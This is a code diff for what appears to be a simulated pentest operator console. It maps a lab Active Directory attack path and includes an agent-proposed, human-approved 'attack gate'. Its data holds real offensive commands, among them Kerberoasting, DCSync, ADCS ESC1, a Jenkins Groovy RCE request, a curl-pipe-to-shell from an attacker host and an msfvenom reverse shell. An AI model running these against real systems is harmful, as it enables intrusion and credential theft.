   function play(){ timers.forEach(clearTimeout); timers=[]; cy.elements().remove(); clearLog(); hideDrawer(); clearPath(); running=true; curPhase="Queued"; renderPhases(); renderLegend();
-    var acc=0; BEATS.forEach(function(b,i){ acc+=(reduce?Math.min(b.t,120):b.t); timers.push(setTimeout(function(){ if(b.phase) curPhase=b.phase; (b.add||[]).forEach(function(id){ addNode(id,true); }); setState(b.state); (b.log||[]).forEach(logLine); renderPhases(); renderLegend(); layout(layoutName); if(i===BEATS.length-1){ running=false; renderLegend(); setTimeout(function(){ cy.animate({fit:{eles:cy.elements(),padding:40}},{duration:400}); },550); } }, acc)); }); }
+    var acc=0; BEATS.forEach(function(b,i){ acc+=(reduce?Math.min(b.t,120):b.t); timers.push(setTimeout(function(){ if(b.phase) curPhase=b.phase; (b.add||[]).forEach(function(id){ addNode(id,true); }); setState(b.state); (b.log||[]).forEach(logLine); renderPhases(); renderLegend(); layout(layoutName); beatPop(b); buildServiceTree(); refreshPanes(); if(i===BEATS.length-1){ running=false; renderLegend(); setTimeout(function(){ cy.animate({fit:{eles:cy.elements(),padding:40}},{duration:400}); },550); } }, acc)); }); }
 
   /* regions */
   var RC=["#89b4fa","#a6e3a1","#f9e2af","#fab387","#cba6f7","#f38ba8"];
@@ -684,6 +937,351 @@ h1,h2,h3{font-family:var(--mono);font-weight:700;letter-spacing:-.01em;color:var
 
   document.addEventListener("keydown",function(e){ if(!cy||CUR!=="run") return; if(e.key==="Escape"){ if(regionMode) setRegionMode(false); hideDrawer(); clearPath(); }
     else if((e.key==="c"||e.key==="C")&&!e.ctrlKey&&!e.metaKey){ var tag=(document.activeElement&&document.activeElement.tagName||"").toLowerCase(); if(tag==="input"||tag==="textarea") return; var on=cy.nodes(".onpath"); if(on.length<2) return; var text=on.map(function(n){ return n.data("label"); }).join(" -> "); if(navigator.clipboard&&navigator.clipboard.writeText) navigator.clipboard.writeText(text); toast("path copied"); } });
+
+  /* ============================================================
+     OPERATOR CONSOLE — service tree · actions · references · findings ·
+     attack gate · catalog · credentials · report (all tied to the map)
+     ============================================================ */
+  var HTB="https://book.hacktricks.wiki/en/";
+  var ACTIONS={
+    t_dmz:[
+      {t:1,s:1,rw:"attacker",p:"1-65535",src:"nmap",l:"Full TCP + version/script scan",c:"nmap -sCV -p- -T4 10.10.10.5"},
+      {t:1,rw:"attacker",p:"top-100",src:"nmap",l:"UDP top-100 sweep",c:"nmap -sU --top-ports 100 10.10.10.5"},
+      {t:1,rw:"attacker",p:"open",src:"nmap-nse",l:"Vuln scripts on discovered services",c:"nmap --script 'vuln and not *vulners*' -p22,80,443,8080 10.10.10.5"}
+    ],
+    s_http:[
+      {t:1,s:1,rw:"attacker",p:80,src:"web",l:"Content discovery (feroxbuster)",c:"feroxbuster -u http://10.10.10.5/ -w big.txt -x php,bak,zip -d4 -t100"},
+      {t:1,rw:"attacker",p:80,src:"web",l:"Fingerprint (whatweb · nikto)",c:"whatweb http://10.10.10.5/ ; nikto -h http://10.10.10.5/"},
+      {t:1,s:1,rw:"attacker",p:80,src:"web",l:"Check /backup /robots.txt /.git",c:"curl -s http://10.10.10.5/backup/",rev:"f_backup"}
+    ],
+    s_https:[{t:1,rw:"attacker",p:443,src:"web",l:"TLS cert CN/SAN (hostnames)",c:"openssl s_client -connect 10.10.10.5:443 | openssl x509 -noout -text"}],
+    s_ssh:[
+      {t:1,rw:"attacker",p:22,src:"ssh",l:"Banner + auth methods",c:"ssh-audit 10.10.10.5"},
+      {t:2,rw:"attacker",p:22,src:"ssh",l:"Try a held credential (single)",c:"netexec ssh 10.10.10.5 -u svc_ci -p '<vault>'"}
+    ],
+    s_jenkins:[
+      {t:1,s:1,rw:"attacker",p:8080,src:"searchsploit",l:"searchsploit Jenkins 2.401",c:"searchsploit jenkins 2.401"},
+      {t:2,s:1,rw:"attacker",p:8080,src:"web/jenkins",l:"Unauth script console (Groovy RCE)",c:"curl -s http://10.10.10.5:8080/script --data-urlencode \"script=println 'id'.execute().text\"",rev:"f_jenk"},
+      {t:1,rw:"attacker",p:8080,src:"web/jenkins",l:"Loot credentials.xml",c:"curl -s http://10.10.10.5:8080/credentials/store/system/",rev:"c_svcci"}
+    ],
+    s_smbdc:[
+      {t:1,s:1,rw:"attacker",p:445,src:"smb",l:"Null-session shares",c:"netexec smb 172.16.5.10 -u '' -p '' --shares"},
+      {t:1,rw:"attacker",p:445,src:"smb",l:"Broad anonymous enum",c:"enum4linux-ng -A 172.16.5.10"},
+      {t:1,rw:"attacker",p:445,src:"smb",l:"RID cycling (users)",c:"netexec smb 172.16.5.10 -u '' -p '' --rid-brute 10000"},
+      {t:2,rw:"attacker",p:445,src:"smb",l:"Try administrator:'' (single)",c:"netexec smb 172.16.5.10 -u administrator -p '' --shares"}
+    ],
+    s_ldap:[
+      {t:1,s:1,rw:"attacker",p:389,src:"ad/bloodhound",l:"BloodHound collection",c:"bloodhound-python -c All -d corp.local -u svc_ci -ns 172.16.5.10",rev:"f_kroast"},
+      {t:1,rw:"attacker",p:389,src:"ldap",l:"Anonymous root DSE",c:"ldapsearch -x -H ldap://172.16.5.10 -s base namingContexts"},
+      {t:1,s:1,rw:"attacker",p:389,src:"ad",l:"AS-REP roastable users",c:"GetNPUsers.py corp.local/ -usersfile users.txt -no-pass",rev:"f_asrep"}
+    ],
+    s_mssql:[
+      {t:1,s:1,rw:"attacker",p:1433,src:"ad/kerberoast",l:"Kerberoast SPNs",c:"GetUserSPNs.py corp.local/svc_ci -request",rev:"f_kroast"},
+      {t:2,rw:"attacker",p:1433,src:"mssql",l:"Login as svc_sql",c:"mssqlclient.py corp.local/svc_sql@172.16.5.20"},
+      {t:1,rw:"attacker",p:1433,src:"nmap",l:"ms-sql-info",c:"nmap -p1433 --script ms-sql-info 172.16.5.20"}
+    ],
+    s_smbf:[
+      {t:1,s:1,rw:"attacker",p:445,src:"smb",l:"Authenticated share map (svc_sql)",c:"smbmap -H 172.16.5.25 -u svc_sql -p '<vault>'"},
+      {t:1,s:1,rw:"attacker",p:445,src:"smb/gpp",l:"Spider SYSVOL for GPP cpassword",c:"nxc smb 172.16.5.25 -u svc_sql -p '<vault>' -M gpp_password",rev:"f_gpp"}
+    ],
+    s_winrm:[
+      {t:1,s:1,rw:"attacker",p:5985,src:"winrm",l:"WinRM login check (Pwn3d?)",c:"nxc winrm 172.16.5.50 -u jdoe -p '<vault>'"},
+      {t:1,rw:"victim",p:5985,src:"winrm",l:"Interactive shell (evil-winrm)",c:"evil-winrm -i 172.16.5.50 -u jdoe -p '<vault>'"}
+    ],
+    s_certsrv:[
+      {t:1,s:1,rw:"attacker",p:80,src:"adcs/certipy",l:"Find vulnerable templates (ESC1-11)",c:"certipy find -u svc_backup@corp.local -dc-ip 172.16.5.10 -vulnerable",rev:"x_esc1"},
+      {t:3,rw:"attacker",p:80,src:"adcs/certipy",l:"ESC1 — request cert as Administrator ⚑ gated",c:"certipy req -ca CORP-CA -template Vuln -upn administrator@corp.local"}
+    ],
+    h_ws:[
+      {t:1,rw:"attacker",p:445,src:"smb",l:"Enumerate host (nxc)",c:"nxc smb 172.16.5.50 -u jdoe -p '<vault>'"},
+      {t:3,rw:"attacker",p:"—",src:"ad/deleg",l:"Abuse unconstrained delegation ⚑ gated",c:"# coerce DC → capture TGT (PetitPotam + krbrelayx)"}
+    ]
+  };
+  function actionsFor(id){ if(ACTIONS[id]) return ACTIONS[id]; var n=NODE_BY_ID[id]||{},m=META[id]||{},k=n.kind,lbl=n.label||id;
+    if(k==="finding") return m.evidence?[{t:1,rw:"attacker",p:"—",src:(m.refs||"finding"),l:"Reproduce / verify",c:m.evidence}]:[];
+    if(k==="cred") return [{t:1,s:1,rw:"attacker",p:445,src:"spray",l:"Authenticated SMB enum as "+(m.user||"user"),c:"nxc smb 172.16.5.0/24 -u "+(m.user||"user")+" -p '<vault>' --shares"},{t:3,rw:"attacker",p:"multi",src:"spray",l:"Spray across the /24 ⚑ opt-in",c:"nxc smb 172.16.5.0/24 -u "+(m.user||"user")+" -p '<vault>' --continue-on-success"}];
+    if(k==="attack") return [{t:3,rw:"attacker",p:(m.port||"—"),src:(m.mitre||"attack"),l:(m.technique||lbl)+" ⚑ human-gated",c:(m.cmd||"")}];
+    if(k==="host"||k==="target") return [{t:1,rw:"attacker",p:(m.ports||"open"),src:"nmap",l:"Version + script scan",c:"nmap -sCV "+(m.ip||lbl.split(" ")[0])},{t:1,rw:"attacker",p:445,src:"smb",l:"SMB enum",c:"nxc smb "+(m.ip||lbl.split(" ")[0])}];
+    if(k==="service") return [{t:1,rw:"attacker",p:(m.port||"—"),src:"nmap",l:"Targeted version scan",c:"nmap -sV -p"+(m.port||"")+" <host>"}];
+    if(k==="agent") return m.cmd?[{t:1,rw:"attacker",p:"—",src:(m.tool||"agent"),l:"Re-run "+(m.tool||"tool"),c:m.cmd}]:[];
+    if(k==="subnet") return [{t:1,rw:"attacker",p:"—",src:"discovery",l:"Ping-sweep the subnet",c:"nmap -sn "+(m.cidr||"172.16.5.0/24")},{t:1,rw:"attacker",p:445,src:"smb",l:"Sweep SMB across the /24",c:"nxc smb "+(m.cidr||"172.16.5.0/24")}];
+    if(k==="report") return [{t:1,rw:"attacker",p:"—",src:"report",l:"Open the attack-path report",c:"open report.md"}];
+    return []; }
+  var REF={
+    s_http:{ht:["Pentesting Web",HTB+"network-services-pentesting/pentesting-web/index.html"]},
+    s_https:{ht:["Pentesting Web",HTB+"network-services-pentesting/pentesting-web/index.html"]},
+    s_ssh:{ht:["Pentesting SSH",HTB+"network-services-pentesting/pentesting-ssh.html"]},
+    s_jenkins:{ht:["Jenkins",HTB+"network-services-pentesting/pentesting-web/jenkins.html"],edb:[["48870","Jenkins - Reverse Shell (RCE)"],["46453","Jenkins 2.150.2 - RCE"]]},
+    s_smbdc:{ht:["Pentesting SMB",HTB+"network-services-pentesting/pentesting-smb/index.html"]},
+    s_smbf:{ht:["Pentesting SMB",HTB+"network-services-pentesting/pentesting-smb/index.html"]},
+    s_ldap:{ht:["Pentesting LDAP",HTB+"network-services-pentesting/pentesting-ldap.html"]},
+    s_mssql:{ht:["Pentesting MSSQL",HTB+"network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html"]},
+    s_winrm:{ht:["Pentesting WinRM",HTB+"network-services-pentesting/5985-5986-pentesting-winrm.html"]},
+    s_krb:{ht:["Pentesting Kerberos",HTB+"network-services-pentesting/pentesting-kerberos-88/index.html"]},
+    s_certsrv:{ht:["AD CS domain escalation",HTB+"windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"]},
+    f_kroast:{ht:["Kerberoast",HTB+"windows-hardening/active-directory-methodology/kerberoast.html"]},
+    f_asrep:{ht:["AS-REP Roasting",HTB+"windows-hardening/active-directory-methodology/asreproast.html"]},
+    f_dcr:{ht:["DCSync",HTB+"windows-hardening/active-directory-methodology/dcsync.html"]},
+    f_gpp:{ht:["GPP cpassword",HTB+"windows-hardening/active-directory-methodology/index.html"]},
+    f_unc:{ht:["Unconstrained delegation",HTB+"windows-hardening/active-directory-methodology/unconstrained-delegation.html"]},
+    x_esc1:{ht:["AD CS ESC1",HTB+"windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html"]},
+    x_dcsync:{ht:["DCSync",HTB+"windows-hardening/active-directory-methodology/dcsync.html"]},
+    x_golden:{ht:["Golden Ticket",HTB+"windows-hardening/active-directory-methodology/golden-ticket.html"]}
+  };
+  function refsFor(id){ return REF[id]||null; }
+  var FIND_WHERE={f_backup:"10.10.10.5:80",f_jenk:"10.10.10.5:8080",f_kroast:"SQL01 · MSSQLSvc",f_asrep:"corp.local · jdoe",f_unc:"WS01",f_dcr:"corp.local · svc_backup",f_gpp:"FILES01 · SYSVOL",f_cert:"ADCS01",f_ntds:"DC01",f_da:"corp.local"};
+
+  function actHtml(a,i){ var run=a.rw==="victim"?'<span class="badge2 copy">copy</span>':'<span class="badge2 run">run</span>';
+    var tier=a.t?'<span class="badge2 t'+a.t+'">T'+a.t+'</span>':'', star=a.s?'<span class="badge2 star">★</span>':'', port=a.p?'<span class="badge2 port">:'+escapeHtml(String(a.p))+'</span>':'';
+    var btn=a.rw==="victim"?'<button data-copy="'+i+'">Copy</button>':'<button class="go" data-run="'+i+'">Run</button><button data-copy="'+i+'">Copy</button>';
+    return '<div class="act"><div class="al">'+star+tier+run+port+'<span class="name">'+escapeHtml(a.l)+'</span></div><div class="cmd">'+escapeHtml(a.c)+'</div><div class="ab">'+btn+'<span class="src">'+escapeHtml(a.src||"")+'</span></div></div>'; }
+  function renderDrawerExtras(id){
+    var acts=actionsFor(id), ah=document.getElementById("d-actions"); ah.innerHTML="";
+    if(acts.length){ ah.innerHTML='<div class="sec-h">⚙ actions<span class="cnt">'+acts.length+' available</span></div>'; acts.forEach(function(a,i){ ah.insertAdjacentHTML("beforeend",actHtml(a,i)); });
+      Array.prototype.forEach.call(ah.querySelectorAll("[data-run]"),function(b){ b.onclick=function(){ runAction(acts[+b.getAttribute("data-run")],b); }; });
+      Array.prototype.forEach.call(ah.querySelectorAll("[data-copy]"),function(b){ b.onclick=function(){ copyText(acts[+b.getAttribute("data-copy")].c); }; }); }
+    var ref=refsFor(id), rh=document.getElementById("d-refs"); rh.innerHTML="";
+    if(ref){ var html='<div class="sec-h">📚 references</div>'; if(ref.ht) html+='<a class="ref-link" target="_blank" rel="noopener" href="'+ref.ht[1]+'">📖 HackTricks · '+escapeHtml(ref.ht[0])+'<span class="ext">↗</span></a>'; (ref.edb||[]).forEach(function(e){ html+='<a class="ref-link edb" target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/'+e[0]+'">🗂 EDB-'+e[0]+' · '+escapeHtml(e[1])+'<span class="ext">↗</span></a>'; }); rh.innerHTML=html; } }
+  function pulse(id){ var n=cy.getElementById(id); if(n.empty()||reduce) return; n.style("overlay-color","#f2b636"); n.animate({style:{"overlay-opacity":0.42,"overlay-padding":18}},{duration:420,complete:function(){ n.animate({style:{"overlay-opacity":0,"overlay-padding":6}},{duration:640,complete:function(){ n.style("overlay-color","#39c46a"); }}); }}); }
+  function revealResult(id){ if(cy.getElementById(id).empty()){ addNode(id,true); cy.getElementById(id).data("state","done"); layout(layoutName); buildServiceTree(); } pulse(id);
+    var n=NODE_BY_ID[id]||{},m=META[id]||{},k=n.kind;
+    if(k==="finding") return {log:{cls:"f",text:"⚑ "+n.label},title:"New finding",sub:n.label,kind:"finding"};
+    if(k==="cred") return {log:{cls:"c",text:"🔑 looted "+(m.user||n.label)},title:"Credential looted",sub:(m.user||n.label)+(m.secret?(" · "+m.secret):""),kind:"cred"};
+    if(k==="attack") return {log:{cls:"p",text:"[attack-gate] "+(m.technique||n.label)+" proposed"},title:"Attack proposed",sub:(m.technique||n.label)+" — awaiting approval",kind:"gate"};
+    return {log:{cls:"ok",text:"✓ "+n.label},title:"Done",sub:n.label,kind:"ok"}; }
+  function runAction(a,btn){ if(a.rw==="victim"){ copyText(a.c); return; } if(btn){ btn.textContent="✓ ran"; btn.className="ran"; }
+    logLine({cls:"cmd",text:"$ "+a.c});
+    setTimeout(function(){ var res=a.rev?revealResult(a.rev):null; if(res){ logLine(res.log); pop(res.title,res.sub,res.kind); } else { logLine({cls:"ok",text:"✓ completed — "+(a.l||"action")}); pop("Action complete",a.l,"ok"); } refreshPanes(); },440); }
+
+  var TREE=["t_dmz","h_dc01","h_dc02","h_sql","h_files","h_ws","h_adcs"];
+  var HOST_SVCS={t_dmz:["s_http","s_https","s_ssh","s_jenkins"],h_dc01:["s_krb","s_ldap","s_smbdc"],h_dc02:[],h_sql:["s_mssql"],h_files:["s_smbf"],h_ws:["s_winrm"],h_adcs:["s_certsrv"]};
+  function buildServiceTree(){ var el=document.getElementById("svctree"); if(!el||!cy) return; var html='<div class="sh">discovered hosts</div>',any=false;
+    TREE.forEach(function(hid){ if(cy.getElementById(hid).empty()) return; any=true; var n=NODE_BY_ID[hid]||{};
+      html+='<div class="grp"><div class="hostrow" data-node="'+hid+'"><span class="hi">▤</span>'+escapeHtml(n.label||hid)+'</div>';
+      (HOST_SVCS[hid]||[]).forEach(function(sid){ if(cy.getElementById(sid).empty()) return; var sn=NODE_BY_ID[sid]||{}; var star=actionsFor(sid).some(function(a){return a.s;})?'<span class="star">★</span>':'';
+        html+='<div class="svc'+(drawerId===sid?" sel":"")+'" data-node="'+sid+'"><span class="po">●</span>'+escapeHtml(sn.label||sid)+star+'</div>'; });
+      html+='</div>'; });
+    if(!any) html+='<div class="sh" style="color:var(--muted)">scanning…</div>';
+    el.innerHTML=html;
+    Array.prototype.forEach.call(el.querySelectorAll("[data-node]"),function(r){ r.onclick=function(){ selectNodeById(r.getAttribute("data-node")); }; }); }
+  function markTreeSel(id){ Array.prototype.forEach.call(document.querySelectorAll("#svctree .svc"),function(s){ s.classList.toggle("sel",s.getAttribute("data-node")===id); }); }
+  function selectNodeById(id){ var n=cy.getElementById(id); if(n.empty()) return; switchPane("map"); showDrawer(n); pinPath(n); markTreeSel(id); cy.animate({center:{eles:n},zoom:Math.max(cy.zoom(),0.85)},{duration:300}); }
+
+  function switchPane(name){ Array.prototype.forEach.call(document.querySelectorAll("#view-run .pane"),function(p){ p.classList.toggle("on",p.id==="pane-"+name); });
+    Array.prototype.forEach.call(document.querySelectorAll("#run-tabs .rtab"),function(t){ t.classList.toggle("on",t.getAttribute("data-pane")===name); });
+    if(name==="map"&&cy){ setTimeout(function(){ cy.resize(); positionRegions(); },40); } if(name==="catalog") renderCatalog(); }
+  function wireRunTabs(){ Array.prototype.forEach.call(document.querySelectorAll("#run-tabs .rtab"),function(t){ t.onclick=function(){ switchPane(t.getAttribute("data-pane")); }; }); }
+
+  function sevRank(s){ return {crit:4,high:3,med:2,info:1}[s]||0; }
+  function findList(){ var out=[]; NODES.forEach(function(n){ if(n[2]==="finding"&&cy.getElementById(n[0]).nonempty()) out.push({id:n[0],label:n[1],m:META[n[0]]||{}}); }); return out.sort(function(a,b){ return sevRank(b.m.severity)-sevRank(a.m.severity); }); }
+  function renderFindings(){ var body=document.getElementById("findbody"); if(!body) return; var q=(document.getElementById("find-filter").value||"").toLowerCase();
+    var list=findList().filter(function(f){ return !q||(f.label+" "+(f.m.desc||"")+" "+(f.m.refs||"")).toLowerCase().indexOf(q)>=0; });
+    var rows=list.map(function(f){ var m=f.m,sc={crit:"sev-crit",high:"sev-high",med:"sev-med",info:"sev-info"}[m.severity]||"sev-info";
+      return '<tr class="rowlink" data-node="'+f.id+'"><td><span class="sev '+sc+'">'+escapeHtml(m.severity||"info")+'</span></td><td>'+escapeHtml(m.cvss||"—")+'</td><td class="desc"><b>'+escapeHtml(f.label)+'</b><br><span class="muted">'+escapeHtml(m.desc||"")+'</span></td><td>'+escapeHtml(FIND_WHERE[f.id]||"—")+'</td><td>'+escapeHtml(m.remediation||"—")+'</td></tr>'; }).join("");
+    body.innerHTML='<table class="tbl"><thead><tr><th>Sev</th><th>CVSS</th><th>Finding</th><th>Where</th><th>Fix</th></tr></thead><tbody>'+rows+'</tbody></table>';
+    Array.prototype.forEach.call(body.querySelectorAll("[data-node]"),function(r){ r.onclick=function(){ selectNodeById(r.getAttribute("data-node")); }; });
+    document.getElementById("find-count").textContent=list.length+" shown"; }
+
+  var GATE=[{id:"x_esc1",title:"ADCS ESC1 — forge Administrator certificate",host:"172.16.5.60 · ADCS01",result:"f_cert",status:"approved"},
+    {id:"x_dcsync",title:"DCSync — replicate NTDS.dit / krbtgt",host:"172.16.5.10 · DC01",result:"f_ntds",status:"approved"},
+    {id:"x_golden",title:"Golden Ticket — forge krbtgt TGT",host:"corp.local",result:"f_da",status:"approved"},
+    {id:"x_persist",title:"DCShadow persistence — stealth DA backdoor",host:"172.16.5.10 · DC01",result:null,status:"pending",tactic:"Persistence",mitre:"T1207",cmd:"# DCShadow: register rogue DC, push SID-History to a controlled account"}];
+  function renderGate(){ var body=document.getElementById("gatebody"); if(!body) return;
+    body.innerHTML=GATE.map(function(g,i){ var m=META[g.id]||{},st=g.status,label=st==="pending"?"awaiting your approval":st;
+      var btns=st==="pending"?'<div class="gb"><button class="approve" data-appr="'+i+'">✓ Approve &amp; run</button><button class="deny" data-deny="'+i+'">✕ Deny</button></div>':(st==="approved"?'<div class="gmeta" style="color:var(--accent-2)">✓ approved · executed · result highlighted on the map</div>':'<div class="gmeta" style="color:var(--red)">✕ denied by operator — never executed</div>');
+      return '<div class="gatecard '+st+'"><div class="gh"><span class="gt">'+escapeHtml(g.title)+'</span><span class="gst '+st+'">'+label+'</span></div><div class="gmeta">proposed by <b>attack-proposer agent</b> · target <b>'+escapeHtml(g.host)+'</b> · '+escapeHtml(m.tactic||g.tactic||"")+' · MITRE <b>'+escapeHtml(m.mitre||g.mitre||"")+'</b></div><div class="gcmd">'+escapeHtml(m.cmd||g.cmd||"")+'</div>'+btns+'</div>'; }).join("");
+    Array.prototype.forEach.call(body.querySelectorAll("[data-appr]"),function(b){ b.onclick=function(){ approveGate(+b.getAttribute("data-appr")); }; });
+    Array.prototype.forEach.call(body.querySelectorAll("[data-deny]"),function(b){ b.onclick=function(){ denyGate(+b.getAttribute("data-deny")); }; }); }
+  function approveGate(i){ var g=GATE[i],m=META[g.id]||{}; g.status="approved"; logLine({cls:"p",text:"[attack-gate] "+(m.technique||g.title)+" approved by operator"});
+    if(g.result){ if(cy.getElementById(g.result).empty()){ addNode(g.result,true); cy.getElementById(g.result).data("state","done"); layout(layoutName); buildServiceTree(); } pulse(g.result); } pulse(g.id);
+    pop("Attack-gate approved",(m.technique||g.title),"gate"); switchPane("gate"); refreshPanes(); }
+  function denyGate(i){ var g=GATE[i]; g.status="denied"; logLine({cls:"f",text:"[attack-gate] "+g.title+" denied by operator"}); pop("Attack denied",g.title,"info"); refreshPanes(); }
+
+  var CATALOG=[
+    {svc:"ad",port:"88·389·445",cat:"Active Directory",n:143,acts:[
+      {s:1,rw:"attacker",l:"BloodHound collection",c:"bloodhound-python -c All -d corp.local -u <user>",src:"ad"},
+      {s:1,rw:"attacker",l:"Kerberoast SPNs",c:"GetUserSPNs.py corp.local/<user> -request",src:"ad"},
+      {rw:"attacker",l:"DCSync (secretsdump)",c:"secretsdump.py corp.local/<user>@dc -just-dc",src:"ad"},
+      {rw:"victim",l:"Rubeus asktgt / pass-the-ticket",c:"Rubeus.exe asktgt /user:.. /rc4:..",src:"ad"}]},
+    {svc:"web",port:"80·443·8080",cat:"Web",n:124,acts:[
+      {s:1,rw:"attacker",l:"Content discovery (feroxbuster)",c:"feroxbuster -u http://<t>/ -w big.txt -x php,bak",src:"web"},
+      {rw:"attacker",l:"SQLi primitive (manual)",c:"' OR 1=1-- - / UNION SELECT ...",src:"web/oswe"},
+      {rw:"attacker",l:"LFI → wrapper RCE",c:"curl 'http://<t>/?p=php://filter/convert.base64-encode/resource=index'",src:"web"}]},
+    {svc:"smb",port:"139·445",cat:"SMB",n:57,acts:[
+      {s:1,rw:"attacker",l:"Null-session shares",c:"netexec smb <t> -u '' -p '' --shares",src:"smb"},
+      {rw:"attacker",l:"Spider for secrets",c:"nxc smb <t> -u <u> -p <p> -M spider_plus",src:"smb"}]},
+    {svc:"mssql",port:"1433",cat:"Database",n:31,acts:[
+      {s:1,rw:"attacker",l:"Kerberoast via SPN",c:"GetUserSPNs.py corp.local/<u> -request",src:"mssql"},
+      {rw:"attacker",l:"xp_cmdshell (if sysadmin)",c:"mssqlclient.py <u>@<t> -> enable_xp_cmdshell",src:"mssql"}]},
+    {svc:"adcs",port:"80·443",cat:"AD CS",n:19,acts:[
+      {s:1,rw:"attacker",l:"Find vulnerable templates",c:"certipy find -vulnerable -u <u> -dc-ip <dc>",src:"adcs"},
+      {rw:"attacker",l:"ESC1 request (gated)",c:"certipy req -template Vuln -upn administrator@corp.local",src:"adcs"}]},
+    {svc:"ldap",port:"389·636",cat:"Directory",n:22,acts:[
+      {s:1,rw:"attacker",l:"AS-REP roastable users",c:"GetNPUsers.py corp.local/ -no-pass -usersfile u.txt",src:"ldap"},
+      {rw:"attacker",l:"Anonymous naming contexts",c:"ldapsearch -x -H ldap://<t> -s base namingContexts",src:"ldap"}]},
+    {svc:"winrm",port:"5985·5986",cat:"Remote",n:9,acts:[
+      {s:1,rw:"attacker",l:"Login check (Pwn3d?)",c:"nxc winrm <t> -u <u> -p <p>",src:"winrm"},
+      {rw:"victim",l:"Interactive shell",c:"evil-winrm -i <t> -u <u> -p <p>",src:"winrm"}]},
+    {svc:"snmp",port:"161/udp",cat:"UDP",n:14,acts:[
+      {rw:"attacker",l:"Walk with default community",c:"snmpwalk -v2c -c public <t>",src:"snmp"}]},
+    {svc:"ftp",port:"21",cat:"File",n:16,acts:[
+      {rw:"attacker",l:"Anonymous listing",c:"ftp -n <t> (USER anonymous)",src:"ftp"}]},
+    {svc:"redis",port:"6379",cat:"Database",n:12,acts:[
+      {rw:"attacker",l:"Unauth INFO / KEYS",c:"redis-cli -h <t> INFO",src:"redis"}]},
+    {svc:"nfs",port:"2049",cat:"File",n:8,acts:[
+      {rw:"attacker",l:"Show exports",c:"showmount -e <t>",src:"nfs"}]},
+    {svc:"linux",port:"—",cat:"Privesc (victim)",n:73,acts:[
+      {rw:"victim",l:"linPEAS",c:"curl <lhost>/linpeas.sh | sh",src:"linux"},
+      {rw:"victim",l:"GTFOBins / sudo -l",c:"sudo -l ; sudo <bin>",src:"linux"}]},
+    {svc:"windows",port:"—",cat:"Privesc (victim)",n:40,acts:[
+      {rw:"victim",l:"winPEAS",c:".\\winPEASx64.exe",src:"windows"},
+      {rw:"victim",l:"Potato family",c:"GodPotato -cmd 'cmd /c whoami'",src:"windows"}]},
+    {svc:"shells",port:"—",cat:"Transfer / shells",n:39,acts:[
+      {rw:"victim",l:"HTTP file transfer",c:"python3 -m http.server 80 ; wget <lhost>/f",src:"shells"},
+      {rw:"attacker",l:"msfvenom (copy-only builder)",c:"msfvenom -p windows/x64/shell_reverse_tcp LHOST=.. -f exe",src:"shells"}]}
+  ];
+  function renderCatalog(){ var body=document.getElementById("catbody"); if(!body) return; var q=(document.getElementById("cat-filter").value||"").toLowerCase(), starOnly=document.getElementById("cat-star").classList.contains("on"), shownS=0,shownA=0;
+    body.innerHTML=CATALOG.map(function(s){ var acts=s.acts.filter(function(a){ if(starOnly&&!a.s) return false; return !q||(s.svc+" "+s.cat+" "+a.l+" "+a.c).toLowerCase().indexOf(q)>=0; }); if(!acts.length) return ""; shownS++; shownA+=acts.length;
+      var rows=acts.map(function(a,i){ var b=a.rw==="victim"?'<span class="badge2 copy">copy</span>':'<span class="badge2 run">run</span>',star=a.s?'<span class="badge2 star">★</span>':'';
+        return '<div class="cat-act">'+star+b+'<span class="can">'+escapeHtml(a.l)+'</span><span class="ccmd">'+escapeHtml(a.c)+'</span><button class="cgo" data-cat="'+s.svc+"|"+i+'">'+(a.rw==="victim"?"Copy":"Run")+'</button></div>'; }).join("");
+      return '<div class="cat-svc"><div class="csh"><b>'+escapeHtml(s.svc)+'</b><span class="cport">'+escapeHtml(s.port)+'</span><span class="ccat">'+escapeHtml(s.cat)+'</span><span class="ccount">'+s.n+' actions</span></div>'+rows+'</div>'; }).join("");
+    document.getElementById("cat-shown").textContent="showing "+shownS+" of 183 services · "+shownA+" actions";
+    var sugg=0; CATALOG.forEach(function(s){ s.acts.forEach(function(a){ if(a.s) sugg++; }); }); document.getElementById("cat-sugg").textContent=sugg;
+    Array.prototype.forEach.call(body.querySelectorAll("[data-cat]"),function(btn){ btn.onclick=function(){ var p=btn.getAttribute("data-cat").split("|"),s=CATALOG.filter(function(x){return x.svc===p[0];})[0],a=s.acts[+p[1]];
+      if(a.rw==="victim"){ copyText(a.c); } else { switchPane("map"); logLine({cls:"cmd",text:"$ "+a.c}); setTimeout(function(){ logLine({cls:"ok",text:"✓ "+a.l}); pop("Action complete",s.svc+" · "+a.l,"ok"); },420); } }; }); }
+
+  function credList(){ var out=[]; ["c_svcci","c_svcsql","c_jdoe","c_svcbk"].forEach(function(id){ if(cy.getElementById(id).nonempty()) out.push(id); }); return out; }
+  function renderCreds(){ var body=document.getElementById("credbody"); if(!body) return; var ids=credList();
+    var rows=ids.map(function(id){ var m=META[id]||{}; return '<tr class="rowlink" data-node="'+id+'"><td><b>'+escapeHtml(m.user||id)+'</b></td><td>'+escapeHtml(m.domain||"")+'</td><td>'+escapeHtml(m.type||"password")+'</td><td class="secret">'+escapeHtml(m.secret||"")+'</td><td>'+escapeHtml(m.source||"")+'</td><td>'+escapeHtml(m.privileges||"")+'</td></tr>'; }).join("");
+    body.innerHTML='<table class="tbl"><thead><tr><th>User</th><th>Domain</th><th>Type</th><th>Secret</th><th>Source</th><th>Privileges</th></tr></thead><tbody>'+rows+'</tbody></table>';
+    Array.prototype.forEach.call(body.querySelectorAll("[data-node]"),function(r){ r.onclick=function(){ selectNodeById(r.getAttribute("data-node")); }; });
+    document.getElementById("cred-count").textContent=ids.length+" credentials · shown in full"; }
+
+  function renderReport(){ var body=document.getElementById("reportbody"); if(!body) return; var finds=findList(),creds=credList();
+    var sev={crit:0,high:0,med:0,info:0}; finds.forEach(function(f){ var s=f.m.severity||"info"; sev[s]=(sev[s]||0)+1; });
+    var fm="---\ntype: attack-path-report\nproject: CORP-INTERNAL\ntarget: 172.16.5.0/24 + 10.10.10.5\nstatus: domain-admin\nfindings: "+finds.length+"\ntags: [oscp, ad, windows, pivot]\n---";
+    var frows=finds.map(function(f){ var m=f.m; return "<tr><td>"+escapeHtml(m.severity||"info")+"</td><td>"+escapeHtml(m.cvss||"—")+"</td><td>"+escapeHtml(f.label)+"</td><td>"+escapeHtml(FIND_WHERE[f.id]||"—")+"</td></tr>"; }).join("");
